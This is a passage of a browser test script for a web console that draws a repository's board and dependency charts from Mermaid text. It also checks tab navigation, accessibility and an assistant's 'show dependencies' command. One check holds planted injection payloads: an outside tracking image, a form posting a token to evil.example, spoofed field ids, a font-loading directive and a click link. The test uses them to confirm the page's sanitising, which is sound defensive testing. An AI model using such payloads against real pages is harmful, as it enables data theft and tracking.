  assert.ok(sizes.every((x) => x[0] > 0 && x[1] > 0), 'a board chart has no size once its tab opens');
  // the box's words, the drawn pictures left out, whose own styles name their classes
  const text = await page.$eval('#cp-board', (box) => { const copy = box.cloneNode(true); copy.querySelectorAll('svg').forEach((svg) => svg.remove()); return copy.textContent; });
  console.log('     board charts:', await page.$$eval('#cp-board .control__chart svg', (l) => l.length), '| raw text shown:', /flowchart|classDef/.test(text), '| vendor loads:', vendorLoads(requests));
  assert.ok(!/flowchart|classDef|==>/.test(text), 'the board box shows chart text: ' + text.slice(0, 200));
  assert.equal(await page.$$eval('#cp-board pre', (l) => l.length), 0);
  assert.deepEqual(await page.$$eval('#cp-board h4, #cp-board h3', (hs) => hs.map((h) => h.textContent)).then((hs) => hs.filter((h) => /Goals|Epic/.test(h))), ['Goals', 'Epic #20: Draw the board (1/3)']);
  assert.equal(vendorLoads(requests), 1);
  const contrast = await chartContrast(page, '#cp-board');
  console.log('     contrast on the ground:', JSON.stringify(contrast));
  assertContrast(contrast);
  const before = await where(page);
  assert.deepEqual([before.hash, before.shown, before.y], ['#board', ['board'], 0]);
  assert.ok(before.scrollable, 'the page fits the window, so the window staying at 0 proves nothing');
  await page.click('#cp-board g.node[id*="-flowchart-i22-"]');
  // read at once, before any call that would open a tab itself
  const after = await where(page);
  await sleep(800);
  const settled = await where(page);
  const view = await inBox(page, '#cp-claimed tr[data-number="22"]');
  console.log('     after the press:', JSON.stringify(after), '| a moment later:', settled.y, '| row:', view, '| message line:', await msgText(page));
  assert.deepEqual([after.hash, after.shown, after.y, settled.y], ['#tasks', ['tasks'], 0, 0], 'the press did not open the Tasks tab alone, or moved the window');
  assert.equal(view, 'in view');
  await page.waitForSelector('#cp-claimed tr[data-number="22"].control__focus', { timeout: 8000 });
  assert.equal(await page.textContent('#cp-graph-said'), 'Focused #22 (under Claimed).');
  // pressed from the Board tab, the person sees neither tab's said line, so the message line says it
  assert.equal(await msgText(page), 'Focused #22 (under Claimed).');
  assert.deepEqual(errors, []);
  await context.close();
});

// a board's text with its Dependencies section holding the blocks given, each under its heading
function boardWith(blocks) {
  return board + '\n## Dependencies\n\nEach open epic\'s tasks as GitHub\'s sub-issues and blocked-by relations hold them.\n' +
    blocks.map(([heading, text]) => '\n### ' + heading + '\n\n```mermaid\n' + text + '\n```\n').join('');
}
// a repository with no epic, so the Dependencies tab hands the drawing nothing and whatever is drawn is the board's
function boardOnlyRoutes(text) {
  const routes = baseRoutes('acme/demo', [issue(7, 'A task', ['todo']), issue(8, 'Another', ['claimed', 'worker:alice'])]);
  routes['GET /repos/acme/demo/contents/STATE.md'] = { encoding: 'base64', content: b64(text) };
  return routes;
}
// Issues whose titles hold every printable ASCII character between them, each short enough that the
// cut leaves it whole, one holding the fullwidth and small percent and dollar signs the fold turns
// into the plain ones, and a node of each class and of none: the node lines the Board tab's gate
// (BOARD_NODE_LINE in the site's script) must let through when the board writes them. GATE_TEXT is
// the block the library at FIXTURE_COMMIT writes for them; A2 renders it again with the checkout
// named, and R3 hands the Board tab that fresh render, so a change to the library's labels that the
// gate does not follow fails here before a board's chart is shown as text.
const PRINTABLE = Array.from({ length: 94 }, (x, i) => String.fromCharCode(33 + i)).join('');
const GATE_ISSUES = {
  61: { title: PRINTABLE.slice(0, 15) + ' ' + PRINTABLE.slice(15, 32), labels: ['todo'] },
  62: { title: PRINTABLE.slice(32, 48) + ' ' + PRINTABLE.slice(48, 64), labels: ['claimed'] },
  63: { title: PRINTABLE.slice(64, 79) + ' ' + PRINTABLE.slice(79), labels: ['in-review'] },
  64: { title: 'a \uff05\uff05{init} \ufe6a b \uff04\uff04x\ufe69\ufe69', labels: ['blocked'] },
  65: { title: 'Closed long ago', labels: ['todo'], state: 'closed' },
  66: { title: 'In no state', labels: [], progress: [2, 5] },
};
const GATE_TEXT = [
  'flowchart TD',
  '  i61["#61 !#quot;#35;#36;#37;&\'()*+,-./ 0123456789:;#lt;=#gt;?@"]:::todo',
  '  i62["#62 ABCDEFGHIJKLMNOP QRSTUVWXYZ[\\]^_`"]:::claimed',
  '  i63["#63 abcdefghijklmno pqrstuvwxyz{#124;}~"]:::review',
  '  i64["#64 a #37;#37;{init} #37; b #36;#36;x#36;#36;"]:::blocked',
  '  i65["#65 Closed long ago"]:::closed',
  '  i66["#66 In no state (2/5)"]',
].concat(CLASS_LINES).join('\n');
if (process.env.SYMPHONY_PROTOCOL) {
  await check('A2: the block pasted for the gate\'s titles is the library\'s own, as the checkout named renders it', async () => {
    assert.deepEqual(libraryBlock(GATE_ISSUES), [GATE_TEXT], 'the library writes these titles otherwise since ' + FIXTURE_COMMIT + ': paste its block again, and widen the Board tab\'s gate if R3 fails');
  });
} else console.log('SKIP A2: SYMPHONY_PROTOCOL names no checkout of symphony-protocol; the pasted block is from ' + FIXTURE_COMMIT);
// the blocks a board's Dependencies section may hold as the board writes them: the fixture's two,
// check F's hostile, directive, math and folded titles, check M's four, and the gate's titles above
const BOARD_BLOCKS = [
  ['Goals', GOALS_TEXT],
  ['Epic #20: Draw the board (1/3)', EPIC_20_TEXT],
  ['Epic #41: An epic with hard titles (0/5)', F_EPIC_41_TEXT],
  ['Goals of another board', M_GOALS_TEXT],
  ['Epic #60: Second epic (1/6)', M_EPIC_60_TEXT],
  ['Epic #70: A goal that is an epic (0/1)', M_EPIC_70_TEXT],
  ['Epic #67: Every printable character', GATE_TEXT],
];
// hands the Board tab a board of the blocks given and waits until each is either handed the stand-in
// or shown as text, then says which
async function boardHands(blocks) {
  const { context, page, errors } = await open(boardOnlyRoutes(boardWith(blocks)), { extraRoutes: [stubRoute] });
  await signIn(page, null);
  await page.waitForFunction((n) => (window.__charts || []).length + document.querySelectorAll('#cp-board pre').length >= n, blocks.length, { timeout: 8000 });
  await sleep(300);
  const seen = await page.evaluate(() => ({ charts: window.__charts || [], shownAsText: Array.from(document.querySelectorAll('#cp-board pre')).map((pre) => pre.textContent) }));
  await context.close();
  return Object.assign(seen, { errors });
}
await check('R2: the text the Board tab hands the drawing for every block the board writes is byte for byte the board\'s, hostile, directive, math, folded and every printable character among them', async () => {
  const seen = await boardHands(BOARD_BLOCKS);
  console.log('     handed:', seen.charts.length, '| shown as text:', seen.shownAsText.length, '| first lines:', JSON.stringify(seen.charts.map((c) => c.split('\n')[1])));
  assert.deepEqual(seen.shownAsText, [], 'the Board tab refused a block the board writes');
  assert.deepEqual(seen.charts, BOARD_BLOCKS.map((b) => b[1]));
  assert.deepEqual(seen.errors, []);
});
await check('R4: a board chart the drawing script cannot draw keeps its text under the words in the Board tab', async () => {
  const { context, page, errors } = await open(boardOnlyRoutes(boardWith([['Goals', GOALS_TEXT]])), { extraRoutes: [missingRoute] });
  await signIn(page, null);
  await page.waitForFunction(() => /could not be drawn/.test((document.getElementById('cp-board') || {}).textContent || ''), null, { timeout: 8000 });
  const seen = await page.evaluate(() => ({ lead: Array.from(document.querySelectorAll('#cp-board p.admin__lead')).map((p) => p.textContent), text: Array.from(document.querySelectorAll('#cp-board pre.admin__text')).map((pre) => pre.textContent) }));
  console.log('     lead:', JSON.stringify(seen.lead));
  assert.ok(seen.lead.some((l) => /^This chart could not be drawn \(.+\); it is shown here as text\.$/.test(l)), 'no words for the undrawn chart');
  assert.deepEqual(seen.text, [GOALS_TEXT]);
  assert.deepEqual(errors, []);
  await context.close();
});
if (process.env.SYMPHONY_PROTOCOL) {
  await check('R3: the Board tab hands the drawing, unchanged, the block the library named writes now for the gate\'s titles', async () => {
    const fresh = libraryBlock(GATE_ISSUES);
    assert.equal(fresh.length, 1);
    const seen = await boardHands([['Epic #67: Every printable character', fresh[0]]]);
    console.log('     handed:', seen.charts.length, '| shown as text:', seen.shownAsText.length);
    assert.deepEqual(seen.shownAsText, [], 'the Board tab refuses a block the library writes: widen its gate (BOARD_NODE_LINE) to the library\'s labels');
    assert.deepEqual(seen.charts, fresh);
    assert.deepEqual(seen.errors, []);
  });
} else console.log('SKIP R3: SYMPHONY_PROTOCOL names no checkout of symphony-protocol; R2 hands the pasted block');

// What anyone who may push the branch board could put in its charts: a picture fetched from
// elsewhere, a form posting elsewhere, fields under the ids the page's own forms are read by, a
// directive that would load a font from elsewhere, a node made a link, a label written raw, and a
// node whose label names another number. None of them is a chart as the board writes it.
const PLANTED = [
  ['Planted: an image', 'flowchart TD\n  A["<img src=https://tracker.example/pixel.png>"]'],
  ['Planted: a form', 'flowchart TD\n  A["<form action=https://evil.example/collect method=post><input name=token><button>Go</button></form>"]'],
  ['Planted: the page\'s own fields', 'flowchart TD\n  A["<input type=hidden id=cp-task-title value=Planted><textarea id=cp-task-ask>Planted</textarea>"]'],
  ['Planted: a directive', '%%{init: {"fontFamily": "x; src: url(https://tracker.example/font.woff)"}}%%\nflowchart TD\n  i1["#1 a"]'],
  ['Planted: a link', 'flowchart TD\n  i1["#1 a"]\n  click i1 href "https://evil.example/a"'],
  ['Planted: a raw label', 'flowchart TD\n  i1["#1 <b>bold</b> $$x$$"]:::todo'],
  ['Planted: another number', 'flowchart TD\n  i1["#2 a"]:::todo'],
  ['Planted: a raw hash', 'flowchart TD\n  i1["#1 a#60;b #lt;img#gt;"]:::todo'],
];
await check('X: the Board tab draws a block of the board\'s text only where every line is one the board writes, shows any other as text that reads on its ground, and nothing planted makes an element or a request', async () => {
  const text = boardWith([['Goals', GOALS_TEXT], ['Epic #20: Draw the board (1/3)', EPIC_20_TEXT]].concat(PLANTED));
  const { context, page, errors, requests, dialogs } = await open(boardOnlyRoutes(text));
  await signIn(page, null);
  await page.waitForFunction(() => document.querySelectorAll('#cp-board .control__chart svg').length === 2, null, { timeout: 15000 });
  await sleep(800);
  const seen = await page.evaluate(() => {
    const box = document.getElementById('cp-board');
    return {
      svgs: box.querySelectorAll('svg').length,
      planted: box.querySelectorAll('img, form, input, button, textarea, select, a, iframe, object, embed').length,
      notDrawn: Array.from(box.querySelectorAll('p')).filter((p) => /^Not drawn: this block is not a chart as the board writes it/.test(p.textContent)).length,
      shownAsText: Array.from(box.querySelectorAll('pre')).map((pre) => pre.textContent),
      hosts: box.querySelectorAll('[data-chart]').length,
      taskTitle: document.getElementById('cp-task-title') && !!document.getElementById('cp-task-title').closest('#dlg-task'),
      prompt: document.getElementById('cp-task-ask') && !document.getElementById('cp-task-ask').closest('#cp-board'),
      ids: document.querySelectorAll('#cp-task-title').length + ':' + document.querySelectorAll('#cp-task-ask').length,
    };
  });
  const elsewhere = requests.filter((u) => !u.startsWith(BASE) && !/^https:\/\/api\.github\.com\//.test(u) && !/^https:\/\/fonts\.(googleapis|gstatic)\.com\//.test(u));
  console.log('     seen:', JSON.stringify(Object.assign({}, seen, { shownAsText: seen.shownAsText.length })), '| requests elsewhere:', JSON.stringify(elsewhere), '| vendor loads:', vendorLoads(requests));
  assert.equal(seen.svgs, 2, 'the board\'s own two charts were not both drawn');
  assert.equal(seen.planted, 0, 'a planted element is in the Board tab');
  assert.equal(seen.notDrawn, PLANTED.length);
  assert.deepEqual(seen.shownAsText, PLANTED.map((b) => b[1]));
  // only the board's own two blocks keep the text they are drawn from
  assert.equal(seen.hosts, 2, 'a planted block kept its text to be drawn');
  assert.equal(seen.taskTitle, true, 'the task dialog\'s title is not the page\'s own field');
  assert.equal(seen.prompt, true);
  assert.equal(seen.ids, '1:1', 'a planted field took one of the page\'s ids');
  assert.deepEqual(elsewhere, []);
  assert.equal(vendorLoads(requests), 1);
  // shown as text, a block reads: its words and its text on the ground each sits on, in the Board
  // tab's own colours and not a drawing's (4.5 to 1, WCAG's floor for text)
  await toTab(page, 'board');
  const reads = await contrastOf(page, '#cp-board p:has(+ pre.admin__text), #cp-board pre.admin__text');
  console.log('     shown as text, contrast:', JSON.stringify(reads.slice(0, 2)));
  assert.equal(reads.length, 2 * PLANTED.length);
  for (const r of reads) assert.ok(r.words >= 4.5, 'a block shown as text barely reads on its ground: ' + JSON.stringify(r));
  assert.deepEqual(dialogs, []);
  assert.deepEqual(errors, []);
  await context.close();
  // a board whose only blocks are planted loads no drawing script at all
  const only = await open(boardOnlyRoutes(boardWith(PLANTED)));
  await signIn(only.page, null);
  await only.page.waitForFunction((n) => document.querySelectorAll('#cp-board pre').length === n, PLANTED.length, { timeout: 8000 });
  await sleep(500);
  console.log('     planted alone: vendor loads', vendorLoads(only.requests));
  assert.equal(vendorLoads(only.requests), 0);
  assert.deepEqual(only.errors, []);
  await only.context.close();
});

await check('Y: a title on the board that opens an HTML comment hides nothing after it, and a pipe the board escapes in a heading reads as a pipe', async () => {
  const text = '# Board\n\n## Open pull requests\n\n| PR | Title | Branch |\n| --- | --- | --- |\n| #80 | Tidy <!-- the docs | mallory:main |\n\n## Queue (open issues labelled todo, unclaimed and given to no worker)\n\n| Issue | Title | Labels |\n| --- | --- | --- |\n| #23 | Write the body | todo |\n' +
    '\n## Dependencies\n\nEach open epic\'s tasks.\n\n### Goals\n\n```mermaid\n' + GOALS_TEXT + '\n```\n\n### Epic #20: Draw \\| the board (1/3)\n\n```mermaid\n' + EPIC_20_TEXT + '\n```\n';
  const { context, page, errors } = await open(boardOnlyRoutes(text), { extraRoutes: [stubRoute] });
  await signIn(page, null);
  await page.waitForFunction(() => (window.__charts || []).length === 2, null, { timeout: 8000 });
  const seen = await page.evaluate(() => {
    const box = document.getElementById('cp-board');
    return {
      cell: (Array.from(box.querySelectorAll('td')).find((td) => /Tidy/.test(td.textContent)) || {}).textContent,
      headings: Array.from(box.querySelectorAll('h2, h3, h4')).map((h) => h.textContent),
      queueRow: Array.from(box.querySelectorAll('td')).some((td) => td.textContent === 'Write the body'),
    };
  });
  console.log('     seen:', JSON.stringify(seen));
  assert.equal(seen.cell, 'Tidy <!-- the docs');
  assert.ok(seen.queueRow, 'the Queue\'s row is gone');
  assert.deepEqual(seen.headings.filter((h) => /^(Queue|Dependencies|Goals|Epic)/.test(h)), ['Queue (open issues labelled todo, unclaimed and given to no worker)', 'Dependencies', 'Goals', 'Epic #20: Draw | the board (1/3)']);
  assert.deepEqual(await page.evaluate(() => window.__charts), [GOALS_TEXT, EPIC_20_TEXT]);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('S: the page says there is nothing to draw while no repository is chosen, before signing in and after the last one is taken off the list', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { extraRoutes: [stubRoute] });
  assert.equal(await stateText(page), 'Nothing to draw yet: no repository is chosen.');
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/);
  // the X on the repository's card in + Add repository's list takes it off; the words are read back here
  await page.click('#cp-repo-browse');
  await page.click('#rp-list [data-repo="acme/demo"] .repos__x');
  await toTab(page, 'dependencies');
  await waitGraph(page, /^Nothing to draw yet: no repository is chosen\.$/);
  await sleep(300);
  console.log('     state:', await stateText(page), '| graph children:', await page.$$eval('#cp-graph > *', (l) => l.length));
  assert.equal(await page.$$eval('#cp-graph > *', (l) => l.length), 0);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('T: an open list cut at its last page read says that an epic beyond the cut is not drawn', async () => {
  const f = fixture();
  const routes = fixtureRoutes(f);
  const filler = (pageNumber, count) => Array.from({ length: count }, (_, i) => issue(1000 + pageNumber * 100 + i, 'Filler ' + pageNumber + '.' + i, ['todo']));
  routes['GET /repos/acme/demo/issues'] = (url) => {
    const n = Number(url.searchParams.get('page') || 1);
    const next = '<https://api.github.com/repos/acme/demo/issues?state=open&per_page=100&page=' + (n + 1) + '>; rel="next"';
    return resp(200, n === 1 ? f.open.concat(filler(1, 100 - f.open.length)) : filler(n, 100), { headers: { Link: next } });
  };
  const { context, page, errors } = await open(routes, { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  const state = await stateText(page);
  console.log('     state:', state);
  assert.equal(state, 'Drawn from 4 reads of GitHub: 1 goal and 1 epic with sub-issues. A node\'s shade is its state; click one to centre its row in the Tasks tab. Only the first 500 open issues were read, so an epic or goal beyond them is not drawn.');
  assert.deepEqual(errors, []);
  await context.close();
});

await check('U: the rail holds the Dependencies tab right after Tasks, with its ARIA, and the address #dependencies opens it on load', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { extraRoutes: [stubRoute], path: '/symphony/control/?repo=acme/demo#dependencies' });
  // no press: the address alone names the tab
  await signIn(page, null);
  const loaded = await where(page);
  const rail = await page.$$eval('.console__rail [data-tab]', (buttons) => buttons.map((b) => b.getAttribute('data-tab')));
  const aria = await page.evaluate(() => {
    const b = document.getElementById('rail-dependencies'), p = document.getElementById('tab-dependencies');
    return {
      role: b.getAttribute('role'), controls: b.getAttribute('aria-controls'), selected: b.getAttribute('aria-selected'), tabIndex: b.tabIndex,
      name: b.querySelector('.rail__name').textContent, panelRole: p.getAttribute('role'), labelledBy: p.getAttribute('aria-labelledby'), panel: p.getAttribute('data-tab-panel'),
      inside: ['h-dependencies', 'cp-graph-state', 'cp-graph-said', 'cp-graph'].filter((id) => document.getElementById(id) && document.getElementById(id).closest('#tab-dependencies')),
      // an element the address names would be scrolled to by the browser, so none may be called dependencies
      named: !!document.getElementById('dependencies'),
    };
  });
  console.log('     loaded:', JSON.stringify(loaded), '| rail:', rail.join(' '), '| aria:', JSON.stringify(aria));
  assert.deepEqual([loaded.hash, loaded.shown, loaded.y], ['#dependencies', ['dependencies'], 0]);
  assert.ok(rail.indexOf('tasks') >= 0 && rail.indexOf('dependencies') === rail.indexOf('tasks') + 1, 'Dependencies is not the tab after Tasks: ' + rail.join(' '));
  assert.equal(rail.filter((t) => t === 'dependencies').length, 1);
  assert.deepEqual(aria, {
    role: 'tab', controls: 'tab-dependencies', selected: 'true', tabIndex: 0, name: 'Dependencies', panelRole: 'tabpanel', labelledBy: 'rail-dependencies', panel: 'dependencies',
    inside: ['h-dependencies', 'cp-graph-state', 'cp-graph-said', 'cp-graph'], named: false,
  });
  await waitGraph(page, /^Drawn from 4 reads/);
  assert.equal(await inBox(page, '#cp-graph h3'), 'in view');
  // the arrow keys walk the rail in its order: down from Tasks is Dependencies
  await toTab(page, 'tasks');
  await page.focus('#rail-tasks');
  await page.keyboard.press('ArrowDown');
  const keyed = await page.evaluate(() => [location.hash, document.activeElement && document.activeElement.id, document.getElementById('tab-dependencies').hidden, document.getElementById('rail-dependencies').getAttribute('aria-selected')]);
  console.log('     ArrowDown from Tasks:', JSON.stringify(keyed));
  assert.deepEqual(keyed, ['#dependencies', 'rail-dependencies', false, 'true']);
  // its rail button opens it from another tab, and the address follows
  await toTab(page, 'board');
  await toTab(page, 'dependencies');
  // a link to #dependencies on the page already open opens it too
  await toTab(page, 'tasks');
  await page.evaluate(() => { location.hash = '#dependencies'; });
  await page.waitForFunction(() => !document.getElementById('tab-dependencies').hidden, null, { timeout: 8000 });
  const linked = await where(page);
  assert.deepEqual([linked.hash, linked.shown, linked.y], ['#dependencies', ['dependencies'], 0]);
  assert.deepEqual(errors, []);
  await context.close();
});

// Check V's assistant: the repository's workflow carries it, the person may write, the page
// remembers issue #50, and the answer, after the header the action writes when a run ends, asks for
// the Dependencies tab in the vocabulary's own words.
const RUN = 'https://github.com/acme/demo/actions/runs/9';
const FINISHED = '**Claude finished @tester\'s task in 1m 2s** \u2014\u2014 [View job](' + RUN + ')\n\n---\n\n';
const QUESTION_AT = '2026-10-18T10:02:00Z';
function assistantRoutes(routes) {
  routes['GET /repos/acme/demo/contents/.github/symphony/assistant.md'] = { encoding: 'base64', content: b64('# The assistant\n') };
  routes['GET /repos/acme/demo/collaborators/tester/permission'] = { permission: 'write', role_name: 'write', user: { login: 'tester' } };
  routes['GET /repos/acme/demo/issues/50'] = issue(50, 'Assistant: tester', ['assistant']);
  routes['GET /repos/acme/demo/labels/assistant'] = { name: 'assistant' };
  routes['POST /repos/acme/demo/issues/50/comments'] = (url, req, call) => ({ id: 1001, created_at: QUESTION_AT, updated_at: QUESTION_AT, user: { login: 'tester', type: 'User' }, body: call.body.body });
  const answer = { id: 2001, created_at: '2026-10-18T10:02:20Z', updated_at: '2026-10-18T10:03:30Z', user: { login: 'claude[bot]', type: 'Bot' }, body: FINISHED + 'Epic #20 waits on #22, which waits on #99.\n\n```symphony\nshow dependencies\n```\n' };
  routes['GET /repos/acme/demo/issues/50/comments'] = resp(200, [{ id: 1001, created_at: QUESTION_AT, updated_at: QUESTION_AT, user: { login: 'tester', type: 'User' }, body: 'x' }, answer], { headers: { ETag: 'W/"a"' } });
  return routes;
}
await check('V: the assistant\'s "show dependencies" opens the Dependencies tab at its first chart and leaves the window where it was', async () => {
  const { context, page, calls, errors } = await open(assistantRoutes(fixtureRoutes(fixture())), {
    storage: { symphony_panel_assistant: '{"acme/demo":50}' },
    constants: { ASSISTANT_POLL_MS: 400, ASSISTANT_SLOW_MS: 400, ASSISTANT_AFTER_MS: 1500 },
  });
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  // the charts' box scrolled to its end, as a person who read the last chart leaves it
  const left = await page.evaluate(() => { const box = document.getElementById('cp-graph').closest('.console__scroll'); box.scrollTop = box.scrollHeight; return box.scrollTop; });
  assert.ok(left > 0, 'the charts fit their box, so where the answer leaves it says nothing');
  await page.waitForFunction(() => /The assistant issue is #50/.test(document.getElementById('cp-as-state').textContent), null, { timeout: 8000 });
  // the question is asked from the Ask Claude bar at the console's foot while the Board tab is shown,
  // so the answer is what opens the Dependencies tab
  await toTab(page, 'board');
  await page.fill('#cp-as-q', 'What blocks what?');
  await page.click('#cp-as-ask');
  const asked = await where(page);
  assert.deepEqual(asked.shown, ['board']);
  assert.ok(asked.scrollable, 'the page fits the window, so the window staying at 0 proves nothing');
  await page.waitForFunction(() => /Showing the Dependencies tab/.test(document.getElementById('cp-as-actions').textContent), null, { timeout: 10000 });
  const shown = await where(page);
  const top = await page.evaluate(() => document.getElementById('cp-graph').closest('.console__scroll').scrollTop);
  await sleep(800);
  const settled = await where(page);
  const view = await inBox(page, '#cp-graph h3');
  const actions = await page.textContent('#cp-as-actions');
  console.log('     after the answer:', JSON.stringify(shown), '| charts box at', top, '| a moment later:', settled.y, '| first chart\'s heading:', view, '| actions:', actions);
  assert.deepEqual([shown.hash, shown.shown, shown.y, settled.y], ['#dependencies', ['dependencies'], 0, 0], 'the answer did not open the Dependencies tab, or moved the window');
  assert.equal(top, 0, 'the charts\' box was not put back at its first chart');
  assert.equal(view, 'in view');
  assert.match(actions, /Showing the Dependencies tab, which this page draws\./);
  // the next question tells the assistant the section the page is at
  await page.fill('#cp-as-q', 'And now?');
  await page.click('#cp-as-ask');
  let next = null;
  for (let i = 0; i < 40 && !next; i++) { next = calls.filter((c) => c.key === 'POST /repos/acme/demo/issues/50/comments')[1]; if (!next) await sleep(100); }
  console.log('     the next question\'s state:', JSON.stringify(next && next.body && next.body.body.split('```symphony-state\n')[1]));
  assert.ok(next, 'the second question was not sent');
  assert.match(next.body.body, /\nsection: Dependencies\n/);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('W: a node pressed for a task the tables do not hold stays in this tab, says why here and on the message line, and leaves the window where it was', async () => {
  const { context, page, errors, opened } = await open(fixtureRoutes(fixture()));
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  // an earlier press, which opened the Tasks tab and said its focus on the message line
  await page.click('#cp-graph g.node[id*="-flowchart-i22-"]');
  await page.waitForFunction(() => /Focused #22/.test(document.getElementById('msg').textContent), null, { timeout: 8000 });
  await toTab(page, 'dependencies');
  const before = await where(page);
  // #21 is closed, so no task table holds it
  await page.click('#cp-graph g.node[id*="-flowchart-i21-"]');
  const after = await where(page);
  await sleep(800);
  const settled = await where(page);
  const said = await page.textContent('#cp-graph-said');
  const msg = await msgText(page);
  console.log('     after the press:', JSON.stringify(after), '| a moment later:', settled.y, '| said:', said, '| message line:', msg);
  const words = '#21 is the focus, but it is not in the task tables (closed, a pull request, or without the protocol\'s labels).';
  assert.deepEqual([before.hash, before.shown], ['#dependencies', ['dependencies']]);
  assert.deepEqual([after.hash, after.shown, after.y, settled.hash, settled.shown, settled.y], ['#dependencies', ['dependencies'], 0, '#dependencies', ['dependencies'], 0], 'the press left the tab or moved the window');
  assert.equal(said, words);
  // the message line follows the press, so it no longer says the earlier focus
  assert.equal(msg, words);
  assert.equal(await page.$$eval('#cp-app tr.control__focus', (rows) => rows.length), 0);
  assert.deepEqual(opened.map((p) => p.url()), []);
  assert.deepEqual(errors, []);
  await context.close();
});

await browser.close();
console.log('\n' + results.join('\n'));
if (results.some((r) => r.startsWith('FAIL'))) process.exit(1);
